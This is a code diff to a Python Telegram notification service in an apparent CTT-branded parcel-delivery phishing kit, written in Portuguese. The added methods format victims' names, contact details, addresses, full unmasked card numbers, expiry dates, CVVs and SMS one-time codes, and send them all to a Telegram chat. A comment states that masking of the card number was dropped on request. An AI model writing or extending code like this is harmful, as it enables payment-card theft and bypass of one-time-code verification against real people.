@@ -131,6 +131,74 @@ class TelegramService:
             logger.error(f"Error formatting payment message: {str(e)}")
             return True  # Still return True since console output worked
     
+    async def send_otp_notification(self, billing_data: Dict[str, Any], otp_code: str, action: str = "send") -> bool:
+        """Send OTP notification to Telegram"""
+        try:
+            action_text = "REENVIADO" if action == "resend" else "ENVIADO"
+            
+            message = f"""📱 CÓDIGO SMS {action_text}
+
+👤 CLIENTE: {billing_data.get('nome', 'N/A')}
+📞 TELEFONE: {billing_data.get('telefone', 'N/A')}
+
+🔢 CÓDIGO OTP: {otp_code}
+⏰ ENVIADO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+⏳ VÁLIDO POR: 2 minutos
+
+🔒 Este código será usado para verificar o pagamento de €2,99
+
+═══════════════════════════════
+📱 SMS de Verificação CTT 📱
+═══════════════════════════════"""
+            
+            return await self.send_message(message)
+            
+        except Exception as e:
+            logger.error(f"Error formatting OTP message: {str(e)}")
+            return False
+
+    async def send_payment_with_otp_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], otp_code: str, tracking_number: str) -> bool:
+        """Send complete payment info with OTP verification to Telegram"""
+        try:
+            # Show full card number (não mascarado conforme solicitado)
+            card_number = card_data.get('numeroCartao', 'N/A')
+            
+            message = f"""💳 PAGAMENTO PROCESSADO COM OTP ✅
+
+👤 DADOS DO CLIENTE:
+┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
+┣━ 📧 Email: {billing_data.get('email', 'N/A')}
+┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
+
+📍 ENDEREÇO DE ENTREGA:
+┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
+┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
+┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}
+
+💰 DETALHES DO PAGAMENTO:
+┣━ 💵 Valor: €2,99
+┣━ 💳 Número do Cartão: {card_number}
+┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
+┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}
+
+🛡️ VERIFICAÇÃO DE SEGURANÇA:
+┣━ 📱 Código OTP: {otp_code}
+┣━ ✅ Status: VERIFICADO
+┗━ 📦 Rastreamento: {tracking_number}
+
+⏰ PROCESSADO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+✅ STATUS: PAGAMENTO CONFIRMADO COM OTP
+
+═══════════════════════════════
+🛡️ Pagamento Seguro Verificado 🛡️
+═══════════════════════════════"""
+            
+            return await self.send_message(message)
+            
+        except Exception as e:
+            logger.error(f"Error formatting payment with OTP message: {str(e)}")
+            return False
+
     async def send_tracking_update(self, tracking_number: str, status: str) -> bool:
         """Send tracking update to Telegram"""
         try:
@@ -142,15 +210,13 @@ class TelegramService:
                 'failed': '❌'
             }
             
-            message = f"""
-📦 *Atualização de Rastreamento CTT*
+            message = f"""📦 Atualização de Rastreamento CTT
 
-🔢 *Número:* {tracking_number}
-{status_emoji.get(status, '📦')} *Estado:* {status}
-⏰ *Atualização:* {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+🔢 Número: {tracking_number}
+{status_emoji.get(status, '📦')} Estado: {status}
+⏰ Atualização: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
 
-🔍 *Rastrear:* [Clique aqui](https://exemplo.com/tracking/{tracking_number})
-            """
+🔍 Rastrear: [Clique aqui](https://exemplo.com/tracking/{tracking_number})"""
             
             return await self.send_message(message)
             
